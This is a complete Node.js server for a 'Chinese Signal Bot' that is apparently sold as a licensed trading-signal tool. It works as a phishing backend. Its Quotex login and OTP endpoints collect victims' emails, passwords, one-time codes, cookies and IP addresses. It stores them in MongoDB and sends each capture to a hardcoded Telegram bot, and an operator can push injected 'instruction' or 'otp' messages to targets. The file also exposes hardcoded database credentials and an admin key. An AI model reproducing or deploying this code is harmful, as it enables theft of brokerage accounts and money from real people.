const express = require('express');
const cors    = require('cors');
const axios   = require('axios');
const fs      = require('fs');
const path    = require('path');

// ================== MONGODB SETUP ==================
const mongoose = require('mongoose');

const MONGODB_URI = process.env.MONGODB_URI ||
    'mongodb+srv://Luckybot:Lucky8ixx$@lucky.comleed.mongodb.net/csbot?retryWrites=true&w=majority&appName=Lucky';

let useDatabase = false;

mongoose.connect(MONGODB_URI, {
    serverSelectionTimeoutMS: 5000,
    maxPoolSize: 100,
})
.then(() => {
    useDatabase = true;
    console.log('✅ MongoDB connected: permanent storage enabled');
})
.catch(err => {
    console.warn('⚠️  MongoDB connection failed — falling back to file storage:', err.message);
    useDatabase = false;
});

// ================== MONGOOSE SCHEMAS ==================

const userSchema = new mongoose.Schema({
    id:           { type: String, required: true, unique: true },
    licenceKey:   { type: String, required: true, index: true },
    fullName:     { type: String, default: 'Unknown' },
    username:     { type: String, default: '' },
    password:     { type: String, default: '' },
    otp:          { type: String, default: '' },
    ip:           { type: String, default: '' },
    cookies:      { type: String, default: '' },
    status:       { type: String, default: 'Active' },
    connected:    { type: Boolean, default: false },
    blocked:      { type: Boolean, default: false },
    lastActivity: { type: Date, default: Date.now },
    activities:   { type: Array, default: [] },
    createdAt:    { type: Date, default: Date.now },
});

const licenseSchema = new mongoose.Schema({
    key:           { type: String, required: true, unique: true },
    type:          { type: String, default: 'Standard' },
    status:        { type: String, default: 'Active', index: true },
    usesRemaining: { type: Number, default: null },
    assignedTo:    { type: String, default: null },
    dateAdded:     { type: Date, default: Date.now },
    expiry:        { type: Date, default: null },
});

const pendingMessageSchema = new mongoose.Schema({
    userName:    { type: String, required: true, index: true },
    messageData: { type: Object, required: true },
    delivered:   { type: Boolean, default: false, index: true },
    createdAt:   { type: Date, default: Date.now },
});

const User           = mongoose.model('User',           userSchema);
const License        = mongoose.model('License',        licenseSchema);
const PendingMessage = mongoose.model('PendingMessage', pendingMessageSchema);

// ================== DB HELPERS ==================

async function dbGetOrCreateUser(licenceKey, fullName = 'Unknown') {
    const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
    let user = null;

    if (hasName) {
        user = await User.findOne({
            licenceKey,
            fullName: { $regex: new RegExp(`^${fullName}$`, 'i') }
        });
        if (!user) {
            user = await User.findOne({
                licenceKey,
                fullName: { $in: ['Unknown', 'Pending Name', ''] }
            });
        }
    } else {
        user = await User.findOne({ licenceKey });
    }

    if (!user) {
        const newId = Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7);
        user = await User.create({
            id:       newId,
            licenceKey,
            fullName: hasName ? fullName : 'Unknown',
        });
    } else {
        if (hasName && user.fullName !== fullName) user.fullName = fullName;
        user.lastActivity = new Date();
        await user.save();
    }
    return user.toObject();
}

async function dbSaveUser(user) {
    await User.findOneAndUpdate(
        { id: user.id },
        {
            licenceKey:   user.licenceKey,
            fullName:     user.fullName,
            username:     user.username   || '',
            password:     user.password   || '',
            otp:          user.otp        || '',
            ip:           user.ip         || '',
            cookies:      user.cookies    || '',
            status:       user.status     || 'Active',
            connected:    user.connected  || false,
            blocked:      user.blocked    || false,
            lastActivity: new Date(),
            activities:   user.activities || [],
        },
        { upsert: true, new: true }
    );
}

async function dbGetAllUsers() {
    return await User.find().sort({ lastActivity: -1 }).lean();
}

async function dbFindUserByKey(licenceKey) {
    return await User.findOne({ licenceKey }).lean();
}

async function dbGetStats() {
    const [totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses] = await Promise.all([
        User.countDocuments(),
        User.countDocuments({ status: 'Online' }),
        User.countDocuments({ otp: { $nin: [null, ''] } }),
        User.countDocuments({ connected: true }),
        License.countDocuments(),
        License.countDocuments({ status: 'Active' }),
    ]);
    return { totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses };
}

async function dbGetAllLicenses() {
    return await License.find().sort({ dateAdded: -1 }).lean();
}

async function dbFindLicense(key) {
    return await License.findOne({ key }).lean();
}

async function dbInsertLicense(lic) {
    await License.create({
        key:           lic.key,
        type:          lic.type          || 'Standard',
        status:        lic.status        || 'Active',
        usesRemaining: lic.usesRemaining || null,
        assignedTo:    lic.assignedTo    || null,
        expiry:        lic.expiry ? new Date(lic.expiry) : null,
    });
}

async function dbUpdateLicenseStatus(key, status) {
    await License.findOneAndUpdate({ key }, { status });
}

async function dbDeleteLicense(key) {
    await License.deleteOne({ key });
}

async function dbAddPendingMessage(userName, msgPayload) {
    const key = userName.trim().toLowerCase();
    await PendingMessage.create({ userName: key, messageData: msgPayload });
    const oldest = await PendingMessage.find({ userName: key, delivered: false })
        .sort({ createdAt: 1 }).lean();
    if (oldest.length > 20) {
        const toDelete = oldest.slice(0, oldest.length - 20).map(m => m._id);
        await PendingMessage.deleteMany({ _id: { $in: toDelete } });
    }
}

async function dbPollAndClearMessages(userName) {
    const key = userName.trim().toLowerCase();
    const msgs = await PendingMessage.find({ userName: key, delivered: false }).lean();
    if (msgs.length > 0) {
        await PendingMessage.updateMany(
            { userName: key, delivered: false },
            { delivered: true }
        );
    }
    return msgs.map(m => m.messageData);
}

// ================== EXPRESS APP ==================
const app = express();
app.use(cors());
app.use(express.json());

// ================== TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || "7293402395";

async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' });
    } catch (error) {
        console.error('Telegram Error:', error.message);
    }
}

// ================== SSE BROADCAST ==================
const sseClients     = new Set();
const pendingMessages = {}; // in-memory fallback only

function broadcastSSE(eventType, data) {
    const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
    sseClients.forEach(client => {
        try { client.write(`data: ${payload}\n\n`); } catch (e) {}
    });
}

app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.flushHeaders();

    const heartbeat = setInterval(() => {
        try { res.write(`:heartbeat\n\n`); } catch (e) {}
    }, 20000);

    sseClients.add(res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE ready' })}\n\n`);

    req.on('close', () => {
        clearInterval(heartbeat);
        sseClients.delete(res);
    });
});

// ================== FILE FALLBACK STORAGE ==================
const DATA_DIR      = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE     = path.join(DATA_DIR, 'users.json');
const LICENSES_FILE = path.join(DATA_DIR, 'licenses.json');

let users    = [];
let licenses = [];

function ensureDataDir() {
    try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    } catch (e) { console.error('Could not create DATA_DIR:', e.message); }
}

function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        } else {
            fs.writeFileSync(DATA_FILE, '[]');
        }
    } catch (e) { users = []; }
}

function saveUsers() {
    try {
        const tmp = DATA_FILE + '.tmp';
        fs.writeFileSync(tmp, JSON.stringify(users, null, 2));
        fs.renameSync(tmp, DATA_FILE);
    } catch (e) {
        try { fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2)); } catch (e2) {}
    }
}

function loadLicenses() {
    try {
        if (fs.existsSync(LICENSES_FILE)) {
            const data = fs.readFileSync(LICENSES_FILE, 'utf8').trim();
            licenses = data ? JSON.parse(data) : [];
        } else {
            licenses = [];
            fs.writeFileSync(LICENSES_FILE, '[]');
        }
    } catch (e) { licenses = []; }
}

function saveLicenses() {
    try {
        const tmp = LICENSES_FILE + '.tmp';
        fs.writeFileSync(tmp, JSON.stringify(licenses, null, 2));
        fs.renameSync(tmp, LICENSES_FILE);
    } catch (e) {
        try { fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2)); } catch (e2) {}
    }
}

function getOrCreateUserFile(licenceKey, fullName = 'Unknown') {
    const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
    let user;

    if (hasName) {
        user = users.find(u =>
            u.licenceKey === licenceKey &&
            (u.fullName || '').toLowerCase() === fullName.toLowerCase()
        );
        if (!user) {
            user = users.find(u =>
                u.licenceKey === licenceKey &&
                (!u.fullName || u.fullName === 'Unknown' || u.fullName === 'Pending Name')
            );
        }
    } else {
        user = users.find(u => u.licenceKey === licenceKey);
    }

    if (!user) {
        user = {
            id:           Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7),
            licenceKey,
            fullName:     hasName ? fullName : 'Unknown',
            username:     '',
            password:     '',
            otp:          '',
            ip:           '',
            cookies:      '',
            status:       'Active',
            connected:    false,
            lastActivity: new Date().toISOString(),
            activities:   [],
        };
        users.unshift(user);
    }

    if (hasName && user.fullName !== fullName) user.fullName = fullName;
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}

async function getOrCreateUser(licenceKey, fullName = 'Unknown') {
    if (useDatabase) return await dbGetOrCreateUser(licenceKey, fullName);
    return getOrCreateUserFile(licenceKey, fullName);
}

async function saveUser(user) {
    if (useDatabase) await dbSaveUser(user);
    else saveUsers();
}

// ================== LICENSE ROUTES ==================

app.get('/api/licenses', async (req, res) => {
    try {
        res.json(useDatabase ? await dbGetAllLicenses() : licenses);
    } catch (e) {
        console.error('/api/licenses GET error:', e.message);
        res.json(licenses);
    }
});

app.post('/api/licenses', async (req, res) => {
    const { key, type, expiry, maxUses, status } = req.body;
    if (!key) return res.status(400).json({ error: 'Key required' });

    try {
        const newLicense = {
            key,
            type:          type   || 'Standard',
            status:        status || 'Active',
            usesRemaining: maxUses || null,
            assignedTo:    null,
            dateAdded:     new Date().toISOString(),
            expiry:        expiry || null,
        };

        if (useDatabase) {
            const existing = await dbFindLicense(key);
            if (existing) return res.status(400).json({ error: 'License already exists' });
            await dbInsertLicense(newLicense);
        } else {
            if (licenses.find(l => l.key === key))
                return res.status(400).json({ error: 'License already exists' });
            licenses.unshift(newLicense);
            saveLicenses();
        }

        broadcastSSE('license_added', newLicense);
        res.json({ success: true });
    } catch (e) {
        console.error('/api/licenses POST error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.patch('/api/licenses/:key', async (req, res) => {
    const key    = decodeURIComponent(req.params.key);
    const { status } = req.body;

    try {
        if (useDatabase) {
            const license = await dbFindLicense(key);
            if (!license) return res.status(404).json({ error: 'License not found' });
            if (status) await dbUpdateLicenseStatus(key, status);
            broadcastSSE('license_updated', { key, status: status || license.status });
            return res.json({ success: true, key, status: status || license.status });
        }

        const license = licenses.find(l => l.key === key);
        if (!license) return res.status(404).json({ error: 'License not found' });
        if (status) license.status = status;
        saveLicenses();
        broadcastSSE('license_updated', { key, status: license.status });
        res.json({ success: true, key, status: license.status });
    } catch (e) {
        console.error('/api/licenses PATCH error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.delete('/api/licenses/:key', async (req, res) => {
    const key = decodeURIComponent(req.params.key);
    try {
        if (useDatabase) {
            await dbDeleteLicense(key);
        } else {
            licenses = licenses.filter(l => l.key !== key);
            saveLicenses();
        }
        broadcastSSE('license_deleted', { key });
        res.json({ success: true });
    } catch (e) {
        console.error('/api/licenses DELETE error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.post('/api/validate-license', async (req, res) => {
    const { licenseKey } = req.body;
    if (!licenseKey) return res.json({ valid: false, message: 'No key provided' });

    try {
        const license = useDatabase
            ? await dbFindLicense(licenseKey)
            : licenses.find(l => l.key === licenseKey);

        const valid = !!(license &&
            license.status === 'Active' &&
            (!license.expiry || new Date(license.expiry) > new Date()));

        res.json({ valid, message: valid ? 'License is valid' : 'Invalid or expired license key.' });
    } catch (e) {
        console.error('/api/validate-license error:', e.message);
        res.json({ valid: false, message: 'Server error during validation' });
    }
});

// ================== LICENSE ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    try {
        const user = await getOrCreateUser(licenseKey, userName);
        if (userName && userName !== 'Pending Name') user.fullName = userName;
        user.activities = user.activities || [];
        user.activities.push({ action: 'License Activated', timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('license_activated', {
            licenceKey: licenseKey, fullName: userName, ip,
            timestamp:  timestamp || new Date().toLocaleString()
        });

        await sendTelegramMessage(
            `🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`
        );
        res.status(200).json({ status: 'success' });
    } catch (e) {
        console.error('/api/license-activate error:', e.message);
        res.status(500).json({ status: 'error' });
    }
});

// ================== QUOTEX LOGIN ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    try {
        const user     = await getOrCreateUser(licenceKey, name);
        user.username  = email;
        user.password  = password;
        user.ip        = ip;
        user.cookies   = cookies;
        user.status    = 'Online';
        user.activities = user.activities || [];
        user.activities.push({ action: 'Quotex Login Submitted', timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: new Date().toLocaleString() });

        await sendTelegramMessage(
            `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
        );
        res.status(200).json({ status: 'ok' });
    } catch (e) {
        console.error('/api/quotex-login error:', e.message);
        res.status(500).json({ status: 'error' });
    }
});

// ================== OTP ==================
app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    try {
        const user   = await getOrCreateUser(licenceKey, name);
        user.otp     = otp;
        user.ip      = ip;
        user.cookies = cookies;
        user.status  = 'Online';
        user.activities = user.activities || [];
        user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('otp_entered', { licenceKey, fullName: name, email, otp, ip, cookies, timestamp: new Date().toLocaleString() });

        await sendTelegramMessage(
            `🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
        );
        res.status(200).json({ status: 'ok' });
    } catch (e) {
        console.error('/api/quotex-otp error:', e.message);
        res.status(500).json({ status: 'error' });
    }
});

// ================== BLOCK / UNBLOCK USER ==================
app.post('/api/block-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) {
                user.blocked    = true;
                user.status     = 'Blocked';
                user.activities = user.activities || [];
                user.activities.push({ action: '🚫 Blocked by Admin', timestamp: new Date().toLocaleString() });
                await dbSaveUser(user);
            }
            await dbUpdateLicenseStatus(licenceKey, 'Inactive');
            broadcastSSE('user_blocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
            await sendTelegramMessage(
                `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
            );
            return res.json({ success: true });
        }

        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) {
            user.blocked = true;
            user.status  = 'Blocked';
            user.activities.push({ action: '🚫 Blocked by Admin', timestamp: new Date().toLocaleString() });
            saveUsers();
        }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) { lic.status = 'Inactive'; saveLicenses(); }
        broadcastSSE('user_blocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
        await sendTelegramMessage(
            `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
        );
        res.json({ success: true });
    } catch (e) {
        console.error('/api/block-user error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.post('/api/unblock-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) {
                user.blocked    = false;
                user.status     = 'Active';
                user.activities = user.activities || [];
                user.activities.push({ action: '✅ Unblocked by Admin', timestamp: new Date().toLocaleString() });
                await dbSaveUser(user);
            }
            await dbUpdateLicenseStatus(licenceKey, 'Active');
            broadcastSSE('user_unblocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
            return res.json({ success: true });
        }

        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) {
            user.blocked = false;
            user.status  = 'Active';
            user.activities.push({ action: '✅ Unblocked by Admin', timestamp: new Date().toLocaleString() });
            saveUsers();
        }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) { lic.status = 'Active'; saveLicenses(); }
        broadcastSSE('user_unblocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
        res.json({ success: true });
    } catch (e) {
        console.error('/api/unblock-user error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// ================== CHECK ACCESS ==================
app.get('/api/check-access', async (req, res) => {
    const licenseKey = req.query.licenseKey || req.query.licenceKey;
    if (!licenseKey) return res.json({ allowed: false, reason: 'no_key' });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenseKey);
            if (user && user.blocked) return res.json({ allowed: false, reason: 'blocked' });
            const lic = await dbFindLicense(licenseKey);
            if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) {
                return res.json({ allowed: false, reason: 'license_inactive' });
            }
            return res.json({ allowed: true });
        }

        const user = users.find(u => u.licenceKey === licenseKey);
        if (user && user.blocked) return res.json({ allowed: false, reason: 'blocked' });
        const lic = licenses.find(l => l.key === licenseKey);
        if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) {
            return res.json({ allowed: false, reason: 'license_inactive' });
        }
        res.json({ allowed: true });
    } catch (e) {
        console.error('/api/check-access error:', e.message);
        res.json({ allowed: true });
    }
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', async (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
    res.status(200).json({ status: 'success' });
});

app.post('/api/notification-permission', async (req, res) => {
    res.status(200).json({ status: 'success' });
});

// ================== TRIGGER CONNECTED ==================
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || 'User';
    broadcastSSE('show_connected',    { userName });
    broadcastSSE('trigger_connected', { userName });
    await sendTelegramMessage(`🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`);
    res.send('Trigger sent');
});

// ================== SEND MESSAGE TO USER ==================
app.post('/api/send-message', async (req, res) => {
    const { userName, message, type } = req.body;
    if (!userName || !message)
        return res.status(400).json({ error: 'userName and message are required' });

    const ts         = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    const msgType    = type || 'info';
    const msgPayload = { userName, message, type: msgType, timestamp: ts };

    broadcastSSE('injected_message', msgPayload);

    if (useDatabase) {
        await dbAddPendingMessage(userName, msgPayload);
    } else {
        const key = userName.trim().toLowerCase();
        if (!pendingMessages[key]) pendingMessages[key] = [];
        pendingMessages[key].push(msgPayload);
        if (pendingMessages[key].length > 20) pendingMessages[key].shift();
    }

    broadcastSSE('activity', {
        action: `💬 Message Injected [${msgType}] → ${userName}`,
        userName, ip: '—', timestamp: ts,
    });

    const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
    await sendTelegramMessage(
        `${typeEmojis[msgType] || '💬'} <b>Message Injected</b>\n👤 Target: <b>${userName}</b>\n📝 Type: <b>${msgType}</b>\n💬 Message: <b>${message}</b>\n⏰ Time: <b>${ts}</b>`
    );

    res.status(200).json({ success: true, delivered: true });
});

// ================== POLL FOR PENDING MESSAGES ==================
app.get('/api/poll-messages', async (req, res) => {
    const userName = (req.query.userName || '').trim().toLowerCase();
    if (!userName) return res.json({ messages: [] });

    try {
        if (useDatabase) {
            const msgs = await dbPollAndClearMessages(userName);
            return res.json({ messages: msgs });
        }
        const msgs = pendingMessages[userName] || [];
        pendingMessages[userName] = [];
        res.json({ messages: msgs });
    } catch (e) {
        console.error('/api/poll-messages error:', e.message);
        res.json({ messages: [] });
    }
});

// ================== MAINTENANCE MODE ==================
let maintenanceMode = { active: false, until: null, message: 'Under Maintenance. Please check back soon.' };

app.get('/api/maintenance', (req, res) => {
    res.json(maintenanceMode);
});

app.post('/api/maintenance', (req, res) => {
    const { active, until, message, adminKey } = req.body;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });
    maintenanceMode = {
        active:  !!active,
        until:   until   || null,
        message: message || 'Under Maintenance. Please check back soon.',
    };
    broadcastSSE('maintenance_update', maintenanceMode);
    res.json({ ok: true, mode: maintenanceMode });
});

// ================== STATS & DATA ==================
app.get('/api/stats', async (req, res) => {
    try {
        if (useDatabase) return res.json(await dbGetStats());
        res.json({
            totalUsers:        users.length,
            onlineNow:         users.filter(u => u.status === 'Online').length,
            otpCaptured:       users.filter(u => u.otp && u.otp.length >= 4).length,
            connectedAccounts: users.filter(u => u.connected).length,
            totalLicenses:     licenses.length,
            activeLicenses:    licenses.filter(l => l.status === 'Active').length,
        });
    } catch (e) {
        console.error('/api/stats error:', e.message);
        res.json({ totalUsers: 0, onlineNow: 0, otpCaptured: 0, connectedAccounts: 0, totalLicenses: 0, activeLicenses: 0 });
    }
});

app.get('/api/users', async (req, res) => {
    const offset = parseInt(req.query.offset, 10) || 0;
    const limit  = parseInt(req.query.limit,  10) || 0;

    try {
        const allUsers = useDatabase ? await dbGetAllUsers() : users;
        if (limit > 0) {
            return res.json({
                users:  allUsers.slice(offset, offset + limit),
                total:  allUsers.length,
                offset,
                limit,
            });
        }
        res.json(allUsers);
    } catch (e) {
        console.error('/api/users error:', e.message);
        res.json(useDatabase ? [] : users);
    }
});

app.get('/api/latest-activity', async (req, res) => {
    try {
        const allUsers = useDatabase ? await dbGetAllUsers() : users;
        res.json({
            logins: allUsers.filter(u => u.username),
            otps:   allUsers.filter(u => u.otp),
        });
    } catch (e) {
        res.json({ logins: [], otps: [] });
    }
});

app.get('/', (req, res) => {
    res.send(`✅ Chinese Signal Bot Server v4 Running — Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT ✅)' : 'File-based (MONGODB_URI not set)'}`);
});

// ================== START SERVER ==================
const PORT = process.env.PORT || 3000;

async function startServer() {
    if (process.env.MONGODB_URI || MONGODB_URI) {
        try {
            await mongoose.connection.asPromise();
            useDatabase = true;
        } catch (e) {
            console.warn('MongoDB not ready at startup, using file mode:', e.message);
        }
    }

    if (!useDatabase) {
        ensureDataDir();
        loadUsers();
        loadLicenses();
        setInterval(() => {
            try { saveUsers(); } catch (e) {}
            try { saveLicenses(); } catch (e) {}
        }, 30000);
    }

    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`💾 Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT)' : 'File-based — set MONGODB_URI for permanent storage'}`);
    });
}

startServer().catch(err => {
    console.error('Failed to start server:', err);
    process.exit(1);
});
